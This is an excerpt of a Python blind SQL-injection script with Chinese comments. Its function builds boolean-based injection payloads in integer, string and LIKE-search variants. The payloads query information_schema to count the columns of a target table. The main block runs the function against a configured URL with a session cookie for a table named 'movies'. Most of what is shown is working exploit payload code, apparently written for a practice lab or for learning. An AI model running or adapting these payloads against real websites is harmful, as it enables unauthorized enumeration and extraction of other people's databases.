...
def get_cocount(url=glovar.url3, cookie=False, type='search',
    ...
    for i in tbname:
        hex_tbname += hex(ord(i))

    hex_tbname = '0x' + hex_tbname.replace('0x', '')

    # 查数据库test中表的个数基础知识--这里的方法只使用与表的个数少于10的，要是多多于10的话substr(({sql}),2,1)要这样增加截取，或者substr(({sql}),1,2)
    if type == 'int':
        payload = '+or+if((select+count(*)+from+information_schema.columns+where+table_name=' + hex_tbname + ')={ascii_number},1,0)'
    elif type == 'string':
        payload = '\'+or+if((select+count(*)+from+information_schema.columns+where+table_name=' + hex_tbname + ')={ascii_number},1,0)%23'
    elif type == 'search':
        payload = '%\'+or+if((select+count(*)+from+information_schema.columns+where+table_name=' + hex_tbname + ')={ascii_number},1,0)%23'
...
if __name__ == "__main__":
    ...
    #get_cocount(url=glovar.url3)
    get_cocount(url=glovar.url4,cookie=glovar.cookie,type='int',tbname='movies')
